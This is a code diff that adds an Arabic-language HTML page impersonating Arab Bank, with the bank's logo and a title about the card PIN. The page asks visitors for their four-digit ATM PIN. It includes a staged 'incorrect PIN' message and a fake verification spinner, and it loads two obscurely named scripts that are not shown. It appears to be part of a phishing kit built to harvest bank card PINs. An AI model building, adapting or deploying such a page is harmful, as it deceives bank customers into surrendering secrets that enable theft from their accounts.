@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>البنك العربي - الرقم السري للبطاقة</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background-color: #FFFFFF; color: #333; direction: rtl; line-height: 1.6; overflow-x: hidden; }
+        .container { max-width: 400px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; background: #FFF; }
+        .logo-section { text-align: center; padding: 30px 20px 20px; }
+        .arab-bank-logo { width: 150px; height: auto; margin: 0 auto; display: block; }
+        .pin-section { padding: 20px; flex-grow: 1; text-align: center; }
+        .pin-description { font-size: 20px; font-weight: 600; color: #333; margin-bottom: 15px; line-height: 1.6; }
+        .pin-subdescription { font-size: 14px; color: #888; margin-bottom: 30px; line-height: 1.6; }
+        .pin-inputs-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; direction: ltr; }
+        .pin-input { width: 60px; height: 65px; border: 2px solid #CCC; border-radius: 12px; text-align: center; font-size: 28px; font-weight: 700; color: #333; background: #FFF; font-family: 'Cairo', sans-serif; transition: all 0.3s; direction: ltr; }
+        .pin-input:focus { outline: none; border-color: #0066CC; box-shadow: 0 0 0 3px rgba(0,102,204,0.2); background: #F0F8FF; }
+        .pin-input.filled { border-color: #0066CC; background: #F0F8FF; }
+        .submit-btn { width: 100%; max-width: 300px; padding: 14px 20px; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; cursor: not-allowed; font-family: 'Cairo', sans-serif; transition: all 0.3s; opacity: 0.5; pointer-events: none; color: white; background: #CCC; margin: 0 auto; display: block; }
+        .submit-btn.active { opacity: 1; cursor: pointer; pointer-events: auto; background: #0066CC; }
+        .submit-btn.active:hover { background: #0052A3; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.2); }
+        #decline-message { display:none;background:linear-gradient(135deg,#ff6b6b,#ee5a6f);border:none;border-radius:12px;padding:16px 20px;margin-top:16px;box-shadow:0 4px 15px rgba(238,90,111,0.3);animation:slideDown 0.3s ease-out; }
+        @keyframes slideDown { from{opacity:0;transform:translateY(-10px);}to{opacity:1;transform:translateY(0);} }
+        #loadingOverlay { display:none;position:fixed;inset:0;background-color:rgba(0,0,0,0.6);z-index:9999;justify-content:center;align-items:center;flex-direction:column; }
+        #loadingOverlay.show { display:flex; }
+        #loadingOverlay h5 { color:white;margin-top:20px;font-family:'Cairo',sans-serif; }
+        #loadingOverlay p { color:rgba(255,255,255,0.8);font-family:'Cairo',sans-serif; }
+        @keyframes spin { to { transform:rotate(360deg); } }
+        .spin { width:3rem;height:3rem;border:4px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 1s linear infinite; }
+        @media (max-width:480px) { .container{max-width:100%;margin:0;} .arab-bank-logo{width:120px;} .pin-input{width:55px;height:60px;font-size:24px;} .pin-inputs-container{gap:10px;} }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo-section">
+        <img src="logo.png" alt="شعار البنك العربي" class="arab-bank-logo">
+    </div>
+    <div class="pin-section">
+        <p class="pin-description">
+            يرجى إدخال الرقم السري للبطاقة
+        </p>
+        <p class="pin-subdescription">
+            الرقم السري لبطاقتك هو الرمز المكون من 4 أرقام للبطاقة الذي يتم إدخاله عبر ماكينة الصراف الآلي
+        </p>
+        <div class="pin-inputs-container">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="pin1" autocomplete="off">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="pin2" autocomplete="off">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="pin3" autocomplete="off">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="pin4" autocomplete="off">
+        </div>
+        <div id="decline-message">
+            <div style="display:flex;align-items:center;gap:12px;">
+                <div style="width:42px;height:42px;background:rgba(255,255,255,0.25);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                </div>
+                <div style="flex:1;text-align:right;">
+                    <div style="color:white;font-size:15px;font-weight:600;margin-bottom:4px;">الرقم السري غير صحيح</div>
+                    <div style="color:rgba(255,255,255,0.9);font-size:13px;line-height:1.5;">يرجى التحقق من الرقم السري للبطاقة</div>
+                </div>
+            </div>
+        </div>
+        <button class="submit-btn" id="submitBtn" disabled>إرسال</button>
+    </div>
+</div>
+
+<div id="loadingOverlay">
+    <div class="spin"></div>
+    <h5>جاري التحقق...</h5>
+    <p>يرجى الانتظار</p>
+</div>
+
+<script src="js/a5.js"></script>
+<script src="js/kn5k.js"></script>
+</body>
+</html>
